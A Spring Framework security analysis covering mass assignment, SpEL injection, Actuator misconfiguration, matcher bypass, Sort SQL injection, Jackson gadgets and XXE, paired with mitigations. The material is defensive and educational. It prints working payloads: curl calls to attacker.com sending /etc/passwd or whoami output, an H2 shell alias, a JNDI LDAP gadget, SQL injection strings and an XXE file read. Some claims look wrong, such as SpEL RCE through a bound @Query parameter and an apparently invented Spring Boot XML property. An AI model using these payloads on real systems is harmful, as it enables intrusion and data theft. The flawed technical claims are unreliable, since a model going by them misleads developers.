# Spring Framework Security Analysis: Meta-Structure Extraction from Source Code

> **Analysis Target**: Spring Framework 6.x / Spring Boot 3.x
> **Source Investigation**: [GitHub spring-projects/spring-framework](https://github.com/spring-projects/spring-framework), [Spring Documentation](https://docs.spring.io/)
> **Analysis Date**: 2026-02-08
> **CVE Coverage**: 2022-2025

---

## Executive Summary

Spring Framework's design philosophy prioritizes **developer productivity and convention-over-configuration**, which creates structural security vulnerabilities when framework conveniences bypass explicit security decisions. This analysis extracts meta-patterns from Spring's source code revealing how auto-binding, expression evaluation, and default configurations create attack surfaces. Unlike individual CVEs, these are **architectural security implications** stemming from framework design choices.

**Key Findings**:
1. **Implicit Trust in User Input**: DataBinder auto-binds HTTP parameters to Java objects without explicit field whitelisting by default
2. **Expression Language as Attack Surface**: SpEL evaluation in 15+ injection points across Spring ecosystem
3. **Convenience-Driven Defaults**: Actuator endpoints, debug modes, and permissive configurations favor development experience over production security
4. **Pattern Matching Ambiguities**: Security matchers (Regex, Ant, MVC) exhibit parsing inconsistencies exploitable for authorization bypass

---

## Part 1: Framework Architecture Vulnerabilities

### 1.1 Mass Assignment via DataBinder: Implicit Trust Boundary

#### Design Philosophy

Spring MVC's **DataBinder** automatically binds HTTP request parameters to controller method arguments annotated with `@ModelAttribute` or `@RequestBody`. This "convention-over-configuration" approach eliminates boilerplate mapping code.

**Source Code Location**: [`DataBinder.java:245-318`](https://github.com/spring-projects/spring-framework/blob/main/spring-context/src/main/java/org/springframework/validation/DataBinder.java)

#### Implementation Mechanism

```java
// DataBinder.java - Core binding logic
public class DataBinder {
    private String[] allowedFields;      // null by default = ALL FIELDS ALLOWED
    private String[] disallowedFields;   // null by default = NO FIELDS BLOCKED

    protected void checkAllowedFields(MutablePropertyValues mpvs) {
        PropertyValue[] pvs = mpvs.getPropertyValues();
        for (PropertyValue pv : pvs) {
            String field = PropertyAccessorUtils.canonicalPropertyName(pv.getName());
            if (!isAllowed(field)) {
                mpvs.removePropertyValue(pv);  // Remove disallowed field
            }
        }
    }

    protected boolean isAllowed(String field) {
        // DEFAULT BEHAVIOR: If allowedFields is null, EVERYTHING IS ALLOWED
        String[] allowed = getAllowedFields();
        String[] disallowed = getDisallowedFields();
        return ((ObjectUtils.isEmpty(allowed) || PatternMatchUtils.simpleMatch(allowed, field)) &&
                (ObjectUtils.isEmpty(disallowed) || !PatternMatchUtils.simpleMatch(disallowed, field)));
    }
}
```

**Critical Design Flaw**: `ObjectUtils.isEmpty(allowed)` returns `true` when `allowedFields` is `null`, making `isAllowed()` return `true` for **any field** by default.

#### Security Implication

The framework **implicitly trusts** all HTTP parameters to safely map to domain object properties. Developers must **opt-in** to security via `@InitBinder`, creating a "secure by exception" model.

**Framework Documentation Warning** ([DataBinder.java:58-60](https://github.com/spring-projects/spring-framework/blob/main/spring-context/src/main/java/org/springframework/validation/DataBinder.java#L58-L60)):

> "Data binding can lead to security issues by exposing parts of the object graph not meant for external access"

Yet the **default behavior remains permissive**.

#### Attack Scenario

```java
// Domain Model
@Entity
public class User {
    private Long id;
    private String email;
    private String password;
    private boolean isAdmin;  // ⚠️ SECURITY-SENSITIVE FIELD

    // Getters/Setters...
}

// VULNERABLE Controller
@PostMapping("/users/update")
public User updateUser(@ModelAttribute User user) {
    return userRepository.save(user);  // Saves ALL bound fields
}
```

**Exploitation**:
```http
POST /users/update HTTP/1.1
Content-Type: application/x-www-form-urlencoded

id=123&email=attacker@evil.com&isAdmin=true
```

The `isAdmin=true` parameter **auto-binds** to the `User.isAdmin` field, granting admin privileges.

#### Real-World CVE

**CVE-2022-22968**: Spring Framework Data Binding Rules Vulnerability

Prior to Spring Framework 5.3.19 and 5.2.21, the patterns for `disallowedFields` in DataBinder were **case-sensitive**, meaning:

```java
@InitBinder
public void initBinder(WebDataBinder binder) {
    binder.setDisallowedFields("isAdmin");  // Blocks "isAdmin"
}
```

**Bypass**: Send parameter `IsAdmin=true` or `ISADMIN=true` → Different case bypassed the restriction.

**Root Cause**: Inconsistency between:
- `setDisallowedFields()`: Case-sensitive pattern storage
- Property resolution: Case-insensitive JavaBeans conventions

**Fix** ([Spring Blog - CVE-2022-22968](https://spring.io/blog/2022/04/13/spring-framework-data-binding-rules-vulnerability-cve-2022-22968/)): Patterns now normalized to lowercase for comparison.

#### Framework-Based Defense

**Option 1: Field Whitelisting (Recommended)**

```java
@InitBinder
public void initBinder(WebDataBinder binder) {
    binder.setAllowedFields("email", "password");  // ONLY these fields bindable
}

@PostMapping("/users/update")
public User updateUser(@ModelAttribute User user) {
    return userRepository.save(user);
}
```

**Option 2: Data Transfer Objects (DTO Pattern)**

```java
// DTO with ONLY editable fields
public class UserUpdateDTO {
    private String email;
    private String password;
    // NO isAdmin field → Cannot be bound
}

@PostMapping("/users/update")
public User updateUser(@Valid @RequestBody UserUpdateDTO dto) {
    User user = getCurrentUser();
    user.setEmail(dto.getEmail());
    user.setPassword(passwordEncoder.encode(dto.getPassword()));
    return userRepository.save(user);
}
```

**Option 3: Declarative Binding (Spring 6.1+)**

```java
@InitBinder
public void initBinder(WebDataBinder binder) {
    binder.setDeclarativeBinding(true);  // ONLY constructor params + allowedFields
}
```

#### Meta-Pattern Classification

- **Convenience over Safety**: Auto-binding eliminates boilerplate but bypasses explicit trust decisions
- **Implicit Trust Boundaries**: Framework assumes all HTTP parameters are safe for object mapping
- **Opt-In Security**: Protection requires explicit `@InitBinder` configuration per controller

---

### 1.2 Spring Expression Language (SpEL) Injection: Code Execution by Design

#### Design Philosophy

SpEL enables **dynamic expression evaluation** at runtime, powering features across Spring ecosystem:
- `@Value("#{systemProperties['user.home']}")`
- `@PreAuthorize("hasRole('ADMIN')")`
- `@Query("... WHERE name = :#{#name}")`
- Spring Cloud Gateway route predicates

**Design Intent**: Provide scripting capabilities without external DSLs.

#### Implementation Mechanism

**Source**: [`SpelExpressionParser.java`](https://github.com/spring-projects/spring-framework/blob/main/spring-expression/src/main/java/org/springframework/expression/spel/standard/SpelExpressionParser.java)

```java
ExpressionParser parser = new SpelExpressionParser();
EvaluationContext context = new StandardEvaluationContext();

// Expression from user input
Expression exp = parser.parseExpression(userInput);
Object result = exp.getValue(context);  // ⚠️ CODE EXECUTION
```

**SpEL Capabilities**:
- Method invocation: `T(java.lang.Runtime).getRuntime().exec('whoami')`
- Property access: `T(java.lang.System).getProperty('user.home')`
- Constructor calls: `new java.net.URL('http://attacker.com').openStream()`

#### Security Implication

When user-controlled data reaches SpEL evaluation, it becomes **Remote Code Execution (RCE)**.

#### Attack Vector 1: SpEL Injection in @Query Annotations

**Vulnerable Code** (Spring Data JPA):

```java
@Repository
public interface UserRepository extends JpaRepository<User, Long> {

    // SpEL expression uses method parameter
    @Query("SELECT u FROM User u WHERE u.name = :#{#name}")
    List<User> findByName(@Param("name") String name);
}
```

**Exploitation**:

```java
String maliciousName = "T(java.lang.Runtime).getRuntime().exec('curl http://attacker.com?data=' + T(java.nio.file.Files).readString(T(java.nio.file.Paths).get('/etc/passwd')))";

userRepository.findByName(maliciousName);  // RCE
```

**CVE-2022-22980**: Spring Data MongoDB SpEL Expression Injection

Applications using `@Query` or `@Aggregation` with SpEL expressions were vulnerable when query parameters were not sanitized ([Spring Security Advisory](https://spring.io/security/cve-2022-22980/)).

**Affected Versions**: Spring Data MongoDB 3.4.0 - 3.4.1, 3.3.0 - 3.3.4

#### Attack Vector 2: Spring Cloud Function Routing Expression

**CVE-2022-22963**: SpEL Injection in Spring Cloud Function

Spring Cloud Function allows routing via the `spring.cloud.function.routing-expression` HTTP header:

```http
POST /functionRouter HTTP/1.1
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("curl http://attacker.com/exfil?data=$(whoami)")
```

**Impact**: Unauthenticated RCE on any Spring Cloud Function application with routing enabled.

**CVSS Score**: 9.8 (Critical)

**Exploitation in the Wild**: Actively exploited in March 2022 for cryptocurrency mining and botnet deployment ([Akamai Report](https://www.akamai.com/blog/security/spring-cloud-function)).

#### Attack Vector 3: Spring Cloud Gateway Route Definitions

**CVE-2022-22947**: Spring Cloud Gateway Code Injection

When the Gateway Actuator endpoint (`/actuator/gateway/routes`) is exposed without authentication, attackers can inject SpEL expressions into route definitions:

```http
POST /actuator/gateway/routes/hackroute HTTP/1.1
Content-Type: application/json

{
  "id": "hackroute",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{T(java.lang.Runtime).getRuntime().exec('whoami')}"
    }
  }],
  "uri": "http://example.com"
}
```

Trigger execution by refreshing routes:

```http
POST /actuator/gateway/refresh HTTP/1.1
```

**CVSS Score**: 10.0 (Critical)

**Affected Versions**: Spring Cloud Gateway < 3.0.7, < 3.1.1

#### Attack Vector 4: Spring Security Method Security

**Method Security Annotations** use SpEL for authorization logic ([Spring Security Docs](https://docs.spring.io/spring-security/reference/servlet/authorization/method-security.html)):

```java
@PreAuthorize("hasRole('ADMIN')")
public void adminFunction() { }

@PreAuthorize("#username == authentication.name")
public Account getAccount(@Param("username") String username) { }
```

**UNSAFE Pattern** (Injection Risk):

```java
// ❌ VULNERABLE - Never construct SpEL from user input!
@PreAuthorize("hasRole('" + userRole + "')")  // SpEL Injection
public void dangerousMethod() { }
```

**Secure Pattern**:

```java
// ✅ Use parameter expressions
@PreAuthorize("#username == authentication.name")
public Account getAccount(@Param("username") String username) { }

// ✅ Delegate to Java beans
@PreAuthorize("@authz.canAccess(#account)")
public void updateAccount(Account account) { }

@Component("authz")
public class AuthorizationService {
    public boolean canAccess(Account account) {
        // Pure Java logic - no SpEL injection risk
        return account.getOwner().equals(getCurrentUser());
    }
}
```

#### Attack Vector 5: Spring Boot Actuator SpEL Exposure

**CVE-2025-41253**: Spring Cloud Gateway Environment Variable Exposure

When `gateway` is included in `management.endpoints.web.exposure.include`, attackers can execute SpEL expressions to leak environment variables and system properties ([ZeroPath Analysis](https://zeropath.com/blog/cve-2025-41253-spring-cloud-gateway-spel-exposure)).

```http
GET /actuator/gateway/routes HTTP/1.1

# Retrieve route with SpEL: #{systemProperties['AWS_SECRET_KEY']}
```

**Severity**: High (7.5 CVSS) - Information Disclosure leading to credential theft

#### Framework-Based Defense

**1. Never Use User Input in SpEL Expressions**

```java
// ❌ VULNERABLE
String expr = "T(java.lang.Math).max(" + userInput + ", 100)";
parser.parseExpression(expr).getValue();

// ✅ SECURE - Use parameterized expressions
Expression exp = parser.parseExpression("T(java.lang.Math).max(#input, 100)");
exp.getValue(context, Map.of("input", sanitizedUserInput));
```

**2. Use SimpleEvaluationContext (Restricted Mode)**

```java
// StandardEvaluationContext: Full SpEL power (dangerous)
EvaluationContext fullContext = new StandardEvaluationContext();

// SimpleEvaluationContext: No Type references, no constructors, no bean refs
EvaluationContext restrictedContext = SimpleEvaluationContext.forReadOnlyDataBinding().build();

Expression exp = parser.parseExpression(userInput);
exp.getValue(restrictedContext);  // Limited attack surface
```

**3. Disable SpEL in Data Queries**

```java
// Use named parameters instead of SpEL
@Query("SELECT u FROM User u WHERE u.name = :name")
List<User> findByName(@Param("name") String name);  // NOT :#{#name}
```

**4. Secure Actuator Endpoints**

```yaml
# Disable gateway actuator
management.endpoints.web.exposure.exclude: gateway

# Or require authentication
management.endpoint.gateway.enabled: false
```

#### Meta-Pattern Classification

- **Abstraction Opacity**: SpEL evaluation is invisible in `@Value`, `@Query`, and annotations
- **Magic Method Invocation**: Framework auto-evaluates expressions at runtime
- **Serialization as API**: Expression strings are treated as executable code

---

### 1.3 Insecure Defaults: Development Conveniences in Production

#### Design Philosophy

Spring Boot's **auto-configuration** prioritizes "getting started quickly" by enabling features with minimal configuration. Many defaults favor **observability and debugging** over security.

#### Pattern 1: Actuator Endpoint Exposure

**Default Behavior** ([Spring Boot Docs](https://docs.spring.io/spring-boot/reference/actuator/endpoints.html)):

- Over HTTP: Only `/health` exposed by default
- Over JMX: Only `/health` exposed by default

**However**, when developers add:

```yaml
management.endpoints.web.exposure.include: "*"
```

**Exposed Endpoints Include**:

| Endpoint | Sensitive Data | Attack Vector |
|----------|----------------|---------------|
| `/env` | Environment vars, properties | Credential theft (DB passwords, API keys) |
| `/configprops` | `@ConfigurationProperties` | Internal architecture, secrets |
| `/heapdump` | JVM heap memory dump | Passwords, session tokens in memory |
| `/logfile` | Application logs | Stack traces, SQL queries, PII |
| `/mappings` | All `@RequestMapping` endpoints | Attack surface enumeration |
| `/beans` | Spring bean definitions | Component discovery |
| `/gateway/routes` | Spring Cloud Gateway routes | SpEL injection (CVE-2022-22947) |

**Real-World Case**: [Wiz Blog - Spring Boot Actuator Misconfigurations](https://www.wiz.io/blog/spring-boot-actuator-misconfigurations)

> "1 in 4 environments with publicly exposed Actuators had misconfigurations leading to credential leakage or RCE"

#### Attack Scenario: RCE via Actuator

**Step 1**: Expose `/env` and `/refresh` endpoints

```yaml
management.endpoints.web.exposure.include: env,refresh
```

**Step 2**: Inject malicious property via `/env`

```http
POST /actuator/env HTTP/1.1
Content-Type: application/json

{
  "name": "spring.datasource.hikari.connection-test-query",
  "value": "CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd);return \"y4tacker\";}'; CALL EXEC('curl http://attacker.com/exfil?data=$(whoami)');"
}
```

**Step 3**: Trigger property reload via `/refresh`

```http
POST /actuator/refresh HTTP/1.1
```

**Result**: When HikariCP connection pool executes `connection-test-query`, the injected H2 SQL command runs system commands ([Spaceraccoon Blog](https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database/)).

#### Pattern 2: Debug Mode Information Disclosure

**Spring Boot DevTools** auto-enabled in development:

```yaml
# Default when DevTools dependency present
spring.devtools.restart.enabled: true
```

**Risk**: If DevTools remains in production classpath:
- Remote code reload endpoints active
- Detailed error pages with stack traces
- Auto-restart on file changes (DoS vector)

#### Pattern 3: Error Details Exposure

**Default Behavior**:

```yaml
server.error.include-message: never          # Default - secure
server.error.include-binding-errors: never   # Default - secure
server.error.include-stacktrace: never       # Default - secure
server.error.include-exception: false        # Default - secure
```

**Developers Often Override**:

```yaml
# ❌ Dangerous in production
server.error.include-message: always
server.error.include-stacktrace: always
```

**Leaked Information**:
- SQL queries (revealing schema)
- File paths (internal structure)
- Library versions (vulnerability targeting)
- Sensitive parameter values

#### Framework-Based Defense

**1. Principle of Least Exposure**

```yaml
# Only expose necessary endpoints
management.endpoints.web.exposure.include: health,info

# Or use exclude for fine control
management.endpoints.web.exposure.include: "*"
management.endpoints.web.exposure.exclude: env,configprops,heapdump
```

**2. Authentication for Actuators**

```java
@Configuration
public class ActuatorSecurity {
    @Bean
    public SecurityFilterChain actuatorSecurity(HttpSecurity http) throws Exception {
        http.securityMatcher(EndpointRequest.toAnyEndpoint());
        http.authorizeHttpRequests(auth ->
            auth.anyRequest().hasRole("ACTUATOR_ADMIN")
        );
        return http.build();
    }
}
```

**3. Sanitize Sensitive Values**

```yaml
# Hide sensitive property values
management.endpoint.env.show-values: when-authorized
management.endpoint.env.roles: ADMIN

management.endpoint.configprops.show-values: never
```

**4. Disable in Production**

```yaml
# Production profile
spring.devtools.restart.enabled: false
management.endpoints.enabled-by-default: false
management.endpoint.health.enabled: true  # Only health check
```

#### Meta-Pattern Classification

- **Defaults for Development**: Observability features unsafe in production
- **Configuration Complexity**: 50+ `management.*` properties create misconfiguration risk
- **Convenience over Safety**: Exposing `*` endpoints is simple, securing them requires custom code

---

## Part 2: Component-Specific Vulnerabilities

### 2.1 Spring Security: Authorization Bypass via Pattern Matching

#### Pattern Matcher Discrepancies

Spring Security offers **three** request matchers with **different parsing semantics**:

| Matcher Type | Pattern Syntax | Servlet Path Handling | Case Sensitivity |
|--------------|----------------|----------------------|------------------|
| `AntPathRequestMatcher` | Ant-style (`/api/**`) | Normalized | Case-sensitive |
| `RegexRequestMatcher` | Regex (`^/api/.*$`) | RAW (non-normalized) | Configurable |
| `MvcRequestMatcher` | Spring MVC patterns | MVC-aware | Case-insensitive |

#### CVE-2022-22978: RegexRequestMatcher Authorization Bypass

**Severity**: 9.8/10 (Critical) - High-risk authorization bypass

**Vulnerability**: `RegexRequestMatcher` matches against **raw request URI** without servlet path normalization, creating a critical mismatch between security checks and actual routing.

**Discovery**: Reported by Hiroki Nishino, Toshiki Sasazaki, Yoshinori Hayashi, and Jonghwan Kim from LINE Corporation

**Root Cause Analysis**:

The vulnerability stems from the `matches()` method combining servletPath, pathInfo, and queryString directly without normalization. Different servlet containers handle URL encoding differently, creating parser differentials between the security layer and routing layer.

**Source Code Context** ([Spring Security RegexRequestMatcher.java](https://github.com/spring-projects/spring-security/blob/main/web/src/main/java/org/springframework/security/web/util/matcher/RegexRequestMatcher.java)):

```java
// RegexRequestMatcher.java - VULNERABLE CODE
private Pattern pattern;

public boolean matches(HttpServletRequest request) {
    String url = request.getRequestURI();  // RAW URI - no normalization
    return this.pattern.matcher(url).matches();
}
```

**Configuration**:

```java
http.authorizeHttpRequests(auth -> auth
    .requestMatchers(new RegexRequestMatcher("/admin/.*", null)).hasRole("ADMIN")
    .anyRequest().permitAll()
);
```

**Attack Scenarios**:

**1. URL Encoding Bypass**:
```http
GET /admin%2F HTTP/1.1
```

Servlet containers decode `%2F` → `/admin/`, but:
1. `RegexRequestMatcher` sees `/admin%2F` → Pattern `/admin/.*` does NOT match
2. Request bypasses authorization → Handled by `anyRequest().permitAll()`
3. Spring MVC decodes `/admin%2F` → Routes to `/admin/` controller

**2. Newline Character Injection**:
```http
GET /admin%0A HTTP/1.1
```

Some containers interpret `%0A` (newline) as path separator, bypassing regex patterns.

**3. Double Encoding**:
```http
GET /admin%252F HTTP/1.1
```

First decode: `%25` → `%`, creating `/admin%2F`, which passes regex. Second decode by servlet: `%2F` → `/`, routing to `/admin/`.

**Affected Versions**:
- Spring Security 5.5.x prior to 5.5.7
- Spring Security 5.6.x prior to 5.6.4
- Spring Security 5.4.x prior to 5.4.11
- All older unsupported versions

**Real-World Impact**: Applications using `RegexRequestMatcher` for admin panels, API authentication, or role-based access control could be completely bypassed, allowing unauthenticated access to protected resources.

**Fix**: Upgrade to Spring Security 5.5.7, 5.6.4, or 5.7.0+

**Secure Alternative**:

```java
// Use MvcRequestMatcher (MVC-aware normalization)
http.authorizeHttpRequests(auth -> auth
    .requestMatchers(new MvcRequestMatcher(introspector, "/admin/**")).hasRole("ADMIN")
);

// Or AntPathRequestMatcher (normalized)
http.authorizeHttpRequests(auth -> auth
    .requestMatchers(new AntPathRequestMatcher("/admin/**")).hasRole("ADMIN")
);
```

#### Meta-Pattern Classification

- **Parser Differential**: Security layer (RegexRequestMatcher) and routing layer (Spring MVC) parse URLs differently
- **Abstraction Leaks**: Regex matcher exposes raw servlet behavior vs. normalized MVC patterns

---

### 2.2 Spring Boot Actuator: From Information Disclosure to RCE

Covered extensively in Section 1.3 and attack scenarios in Section 1.2 (CVE-2022-22947).

**Additional Attack Vector**: `/jolokia` Endpoint (JMX-over-HTTP)

If Jolokia dependency present:

```xml
<dependency>
    <groupId>org.jolokia</groupId>
    <artifactId>jolokia-core</artifactId>
</dependency>
```

**Exploitation**:

```http
POST /actuator/jolokia HTTP/1.1
Content-Type: application/json

{
  "type": "exec",
  "mbean": "org.springframework.boot:type=Admin,name=SpringApplication",
  "operation": "shutdown"
}
```

**Impact**: Application shutdown (DoS) or arbitrary MBean method invocation.

---

### 2.3 Spring Data: Query Injection and Projection Vulnerabilities

#### Attack Vector 1: SpEL in @Query (Covered in 1.2)

#### Attack Vector 2: Sort Parameter Injection (CVE-2016-6652)

**Severity**: High - SQL Injection via Sort clause

**Vulnerability**: Spring Data JPA's `Sort` instances are passed directly to the persistence provider without sanitization, allowing JPQL/SQL injection when constructed from untrusted input.

**Affected Versions**:
- Spring Data JPA < 1.10.4 (Hopper SR4)
- Spring Data JPA < 1.9.6 (Gosling SR6)

**Vulnerable Code**:

```java
@GetMapping("/users")
public List<User> getUsers(@RequestParam String sortBy) {
    return userRepository.findAll(Sort.by(sortBy));  // ⚠️ User-controlled
}
```

**Exploitation Scenarios**:

**1. JPQL Function Injection**:

```http
GET /users?sortBy=name;DELETE FROM User;-- HTTP/1.1
```

**2. Subquery Injection**:

```http
GET /users?sortBy=(SELECT password FROM User WHERE username='admin') HTTP/1.1
```

**3. H2/MySQL Command Execution**:

```http
GET /users?sortBy=id);UPDATE users SET isAdmin=true WHERE id=1;-- HTTP/1.1
```

**4. Time-Based Blind Injection**:

```http
GET /users?sortBy=CASE WHEN (SELECT COUNT(*) FROM User WHERE isAdmin=true)>0 THEN name ELSE SLEEP(5) END HTTP/1.1
```

**Source Code Analysis** ([CVE-2016-6652 Advisory](https://spring.io/security/cve-2016-6652/)):

Before patch, Spring Data JPA directly interpolated sort fields into ORDER BY clauses:

```java
// VULNERABLE - Pre-1.10.4
query.append("ORDER BY ").append(sort.toString());  // Direct concatenation!
```

**Post-Patch Behavior**:

Spring Data 1.10.4+ sanitizes `Sort` instances:
- Only allows references to domain object fields
- Only allows aliases declared in `@Query`
- Rejects function calls and special characters

**Defense**:

```java
private static final Set<String> ALLOWED_SORT_FIELDS = Set.of("id", "name", "email", "createdAt");

@GetMapping("/users")
public List<User> getUsers(@RequestParam String sortBy, @RequestParam String direction) {
    // Allowlist validation
    if (!ALLOWED_SORT_FIELDS.contains(sortBy)) {
        throw new IllegalArgumentException("Invalid sort field: " + sortBy);
    }

    // Validate direction
    Sort.Direction dir = "desc".equalsIgnoreCase(direction)
        ? Sort.Direction.DESC
        : Sort.Direction.ASC;

    return userRepository.findAll(Sort.by(dir, sortBy));
}
```

**Alternative - Predefined Sort Options**:

```java
@GetMapping("/users")
public List<User> getUsers(@RequestParam(defaultValue = "NAME_ASC") SortOption sortOption) {
    return userRepository.findAll(sortOption.getSort());
}

enum SortOption {
    NAME_ASC(Sort.by(Sort.Direction.ASC, "name")),
    NAME_DESC(Sort.by(Sort.Direction.DESC, "name")),
    DATE_ASC(Sort.by(Sort.Direction.ASC, "createdAt")),
    DATE_DESC(Sort.by(Sort.Direction.DESC, "createdAt"));

    private final Sort sort;
    SortOption(Sort sort) { this.sort = sort; }
    public Sort getSort() { return sort; }
}
```

#### Attack Vector 3: Projection Interface Method Invocation

**Spring Data Projections** can invoke arbitrary getter methods:

```java
public interface UserProjection {
    String getName();
    String getEmail();
}

@Query("SELECT u FROM User u")
List<UserProjection> findAllProjected();
```

**Risk**: If projection interface includes:

```java
public interface MaliciousProjection {
    String getName();

    @Value("#{target.password}")  // SpEL injection via projection
    String getPassword();
}
```

**Defense**: Use **DTO classes** instead of interfaces for projections.

```java
// SECURE - DTO class (no SpEL evaluation)
public class UserDTO {
    private String name;
    private String email;
    // Constructors, getters, setters
}

@Query("SELECT new com.example.UserDTO(u.name, u.email) FROM User u")
List<UserDTO> findAllProjected();
```

---

### 2.6 Jackson Deserialization: Polymorphic Type Handling Vulnerabilities

#### CVE Overview

Jackson's polymorphic deserialization feature has been the source of **30+ CVEs** since 2017, with new gadget classes continuously discovered.

**Key CVEs**:
- **CVE-2017-7525**: Original polymorphic deserialization vulnerability (CVSS 9.8)
- **CVE-2019-14379, CVE-2019-14439**: Additional gadget classes (July 2019)
- **CVE-2020-series**: 20+ CVEs for various gadget bypasses

#### Vulnerability Mechanism

**Polymorphic Type Handling** allows JSON to specify the Java class to deserialize:

```json
{
  "@class": "com.example.User",
  "name": "Alice",
  "role": "admin"
}
```

**Exploitation Requirements**:
1. **Polymorphic typing enabled** (global default typing or `@JsonTypeInfo`)
2. **Attacker-controlled JSON input**
3. **Gadget class in classpath** (e.g., `com.sun.rowset.JdbcRowSetImpl`)

#### Attack Scenario

**Vulnerable Configuration**:

```java
@Configuration
public class JacksonConfig {
    @Bean
    public ObjectMapper objectMapper() {
        ObjectMapper mapper = new ObjectMapper();
        // ❌ DANGEROUS - Enables global polymorphic deserialization
        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);
        return mapper;
    }
}
```

**Gadget Example - JdbcRowSetImpl (JNDI Injection)**:

```json
{
  "@class": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "ldap://attacker.com:1389/Exploit",
  "autoCommit": true
}
```

**Execution Chain**:
1. Jackson deserializes JSON to `JdbcRowSetImpl`
2. `setAutoCommit(true)` triggers JNDI lookup
3. LDAP server returns malicious Java class
4. **Remote Code Execution**

**Other Common Gadgets**:
- `org.apache.commons.configuration.JNDIConfiguration`
- `com.mchange.v2.c3p0.JndiRefForwardingDataSource`
- `org.apache.xbean.propertyeditor.JndiConverter`
- `ch.qos.logback.core.db.DriverManagerConnectionSource`

#### Defense Strategies

**1. Avoid Global Default Typing** (Recommended):

```java
@Bean
public ObjectMapper objectMapper() {
    ObjectMapper mapper = new ObjectMapper();
    // ✅ DO NOT enable default typing
    return mapper;
}
```

**2. Use Allow-List Based Typing (Jackson 2.10+)**:

```java
@Bean
public ObjectMapper objectMapper() {
    ObjectMapper mapper = new ObjectMapper();

    // ✅ SAFE - Only allow specific base types
    mapper.activateDefaultTyping(
        mapper.getPolymorphicTypeValidator(),
        ObjectMapper.DefaultTyping.NON_FINAL,
        JsonTypeInfo.As.PROPERTY
    );

    return mapper;
}

// Custom Validator
public class SafePolymorphicTypeValidator extends BasicPolymorphicTypeValidator {
    @Override
    public Validity validateBaseType(MapperConfig<?> config, JavaType baseType) {
        // Only allow specific packages
        String className = baseType.getRawClass().getName();
        if (className.startsWith("com.example.domain.")) {
            return Validity.ALLOWED;
        }
        return Validity.DENIED;
    }
}
```

**3. Use `@JsonTypeInfo` with Allow-List**:

```java
@JsonTypeInfo(
    use = JsonTypeInfo.Id.NAME,
    include = JsonTypeInfo.As.PROPERTY,
    property = "@type"
)
@JsonSubTypes({
    @JsonSubTypes.Type(value = AdminUser.class, name = "admin"),
    @JsonSubTypes.Type(value = RegularUser.class, name = "regular")
})
public abstract class User {
    // Base class
}
```

**4. Disable JDK Serialization Features**:

```yaml
# Spring Boot application.yml
spring.jackson.deserialization.fail-on-unknown-properties: true
```

#### Meta-Pattern Classification

- **Serialization as API**: JSON becomes executable code selector
- **Convenience over Safety**: Polymorphic typing eliminates boilerplate but enables RCE
- **Gadget Chain Dependency**: Vulnerability requires specific libraries in classpath (implicit trust)

---

### 2.7 XML External Entity (XXE) Injection in Spring

#### CVE Overview

Spring Framework and related projects have had multiple XXE vulnerabilities due to insecure XML parser defaults.

**Key CVEs**:
- **CVE-2013-4152**: Spring OXM JAXB marshaller XXE
- **CVE-2013-7315**: Spring MVC StAX XMLInputFactory XXE
- **CVE-2014-0225**: DTD processing in Spring MVC
- **CVE-2019-3772**: Spring Integration XML XXE
- **CVE-2019-3773**: Spring Web Services XXE

#### Vulnerability Mechanism

**Default Behavior**: Java XML parsers enable external entity resolution by default.

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>
</user>
```

#### Attack Vector 1: Spring OXM (Object-XML Mapping)

**CVE-2013-4152**: JAXB unmarshaller without XXE protection

**Vulnerable Code**:

```java
@RestController
public class XmlController {

    @PostMapping("/import-user")
    public void importUser(@RequestBody String xml) throws Exception {
        JAXBContext context = JAXBContext.newInstance(User.class);
        Unmarshaller unmarshaller = context.createUnmarshaller();

        // ❌ VULNERABLE - No XXE protection
        StringReader reader = new StringReader(xml);
        User user = (User) unmarshaller.unmarshal(reader);
    }
}
```

**Exploitation**:

```xml
<?xml version="1.0"?>
<!DOCTYPE user [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>
</user>
```

**Impact**: File disclosure, SSRF, DoS

#### Attack Vector 2: Spring Web Services

**CVE-2019-3773**: Spring WS processes user-provided XML without disabling XXE

**Affected Versions**: Spring WS < 3.0.5, 2.x < 2.4.4

#### Defense Strategies

**1. Disable DTD Processing** (Recommended):

```java
@Bean
public Jaxb2Marshaller marshaller() {
    Jaxb2Marshaller marshaller = new Jaxb2Marshaller();
    marshaller.setPackagesToScan("com.example.domain");

    // ✅ Disable external entities
    Map<String, Object> props = new HashMap<>();
    props.put(javax.xml.XMLConstants.ACCESS_EXTERNAL_DTD, "");
    props.put(javax.xml.XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");
    marshaller.setMarshallerProperties(props);

    return marshaller;
}
```

**2. Secure XMLInputFactory**:

```java
XMLInputFactory factory = XMLInputFactory.newFactory();

// ✅ Disable external entities
factory.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);
factory.setProperty(XMLInputFactory.SUPPORT_DTD, false);
```

**3. Use Spring Boot Auto-Configuration** (Spring Boot 2.x+):

Spring Boot 2.x+ configures secure XML parsing by default:

```yaml
# Automatically applied in Spring Boot 2+
spring.xml.ignore-external-entity-references: true
```

**4. Validate XML Against Schema**:

```java
@Bean
public Jaxb2Marshaller marshaller() throws SAXException {
    Jaxb2Marshaller marshaller = new Jaxb2Marshaller();
    marshaller.setPackagesToScan("com.example.domain");

    // ✅ Validate against XSD (prevents DOCTYPE injection)
    SchemaFactory factory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);
    Schema schema = factory.newSchema(new File("schema.xsd"));
    marshaller.setSchema(schema);

    return marshaller;
}
```

#### Additional XXE Vectors

**Spring Configuration Files**: Malicious XML in externalized configuration can lead to XXE during application startup.

**Document Parsers**: `DocumentBuilderFactory`, `SAXParserFactory` require explicit XXE protection:

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();

// ✅ Disable XXE
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
